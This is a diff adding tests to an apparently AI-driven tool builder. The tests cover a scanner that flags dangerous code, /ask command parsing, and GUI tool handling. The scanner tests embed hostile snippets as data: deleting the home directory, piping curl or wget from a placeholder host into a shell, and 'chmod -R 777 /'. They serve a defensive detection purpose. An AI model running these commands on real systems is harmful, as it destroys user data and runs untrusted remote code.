@@ -793,6 +793,98 @@ check("the next move after a failed run is /fix",
       ui.next_moves(_tool)[0] == "fix", str(ui.next_moves(_tool)))
 
 print()
+print("== destructive code the scanner used to walk past ==")
+
+# Every pattern matched shell TEXT, so the list form of the same command —
+# subprocess.run(["rm", "-rf", ...]) — matched nothing at all. These matter
+# because the tool gets installed and run for real, outside the sandbox.
+_DESTRUCTIVE = {
+    "rm -rf as an argument list":
+        'import subprocess, os\nsubprocess.run(["rm","-rf", os.path.expanduser("~")])',
+    "rmtree of Path.home()":
+        'from pathlib import Path\nimport shutil\nshutil.rmtree(Path.home())',
+    "rmtree of $HOME":
+        'import shutil, os\nshutil.rmtree(os.environ["HOME"])',
+    "rmtree of a tilde path": 'import shutil\nshutil.rmtree("~/things")',
+    "curl piped into sh": 'import os\nos.system("curl -s http://x/i.sh | sh")',
+    "wget piped into sudo bash":
+        'import os\nos.system("wget -qO- http://x/i | sudo bash")',
+    "chmod -R 777 /": 'import os\nos.system("chmod -R 777 /")',
+    "deleting a recursive glob of home":
+        'import os, glob\n[os.remove(p) for p in '
+        'glob.glob(os.path.expanduser("~/**"), recursive=True)]',
+    "rm -rf / (already caught)": 'import os\nos.system("rm -rf /")',
+}
+for label, snippet in _DESTRUCTIVE.items():
+    check(f"flagged: {label}", bool(engine.looks_dangerous(snippet)))
+
+# ...and it must not cry wolf, or the warning becomes noise people click past.
+_ORDINARY = {
+    "rmtree of a temp dir": 'import shutil, tempfile\nshutil.rmtree(tempfile.mkdtemp())',
+    "an ordinary subprocess call": 'import subprocess\nsubprocess.run(["ls","-la"])',
+    "reading a disk image": 'import os\nos.system("dd if=/dev/sda of=backup.img")',
+    "chmod on its own output": 'import os\nos.system("chmod 755 build/out")',
+    "chmod +x a script": 'import os\nos.system("chmod +x ./run.sh")',
+    "downloading without piping": 'import os\nos.system("curl -o f.tgz http://x/f")',
+    "a docstring that mentions rm -rf /":
+        '"""never run rm -rf / on your machine."""\nprint(1)',
+}
+for label, snippet in _ORDINARY.items():
+    check(f"not flagged: {label}", not engine.looks_dangerous(snippet),
+          str(engine.looks_dangerous(snippet)))
+
+print()
+print("== asking about a tool must not change it ==")
+
+check("/ask is a command", commands.lookup("ask") is not None)
+for phrasing in ("/ask why does it crash", "/quest what does line 40 do",
+                 "ask how does it read config"):
+    kind, cmd, _ = commands.resolve(phrasing)
+    check(f"{phrasing!r} asks", kind == commands.RUN and cmd.name == "ask")
+
+# The alias is an English word and part of the sentence it introduces.
+_, _, q = commands.resolve("why does it hang on empty input")
+check("'why ...' keeps the whole question",
+      q == "why does it hang on empty input", repr(q))
+_, _, q2 = commands.resolve("explain the retry logic")
+check("'explain ...' keeps the whole question", q2 == "explain the retry logic", repr(q2))
+check("'asking for a friend' is still an instruction",
+      commands.resolve("asking for a friend")[0] == commands.SAY)
+
+_ask_src = _ins.getsource(agent.Frida.ask)
+check("/ask sends the source with line numbers", "enumerate(" in _ask_src)
+check("/ask does not append to the build conversation",
+      "self.tool.messages.append" not in _ask_src)
+check("/ask never assigns code", "self.tool.code =" not in _ask_src)
+
+print()
+print("== windowed tools ==")
+
+check("a window request is recognised", agent.wants_gui("a gui tool to rename photos"))
+check("...and a desktop app", agent.wants_gui("a desktop app for notes"))
+check("an explicit CLI request wins over 'interface'",
+      not agent.wants_gui("a cli tool with a nice interface"))
+check("a TUI is not a GUI", not agent.wants_gui("a tui dashboard"))
+check("a plain request stays a terminal tool",
+      not agent.wants_gui("something to sort files"))
+
+check("a new tool starts as a terminal tool", agent.Tool().kind == "cli")
+check("the kind survives a save/restore",
+      agent.Tool.restore({"kind": "gui", "code": "x"}).kind == "gui")
+check("/gui and /cli both exist",
+      commands.lookup("gui") is not None and commands.lookup("cli") is not None)
+
+# A GUI tool cannot be verified by running it — it would open a window and
+# block until the timeout, which to the harness looks exactly like a hang.
+_h_src = _ins.getsource(harness.verify)
+check("the GUI path runs --self-test", "_case_selftest" in _h_src)
+check("...and skips the bare run that would block",
+      _h_src.index('kind == "gui"') < _h_src.index("_case_bare"))
+check("tkinter has an install hint", bool(engine.tk_install_hint()))
+check("...that is never 'pip install tkinter'",
+      "pip" not in engine.tk_install_hint().lower(), engine.tk_install_hint())
+
+print()
 if FAILURES:
     print(f"something failed: {len(FAILURES)}")
     for f_ in FAILURES:
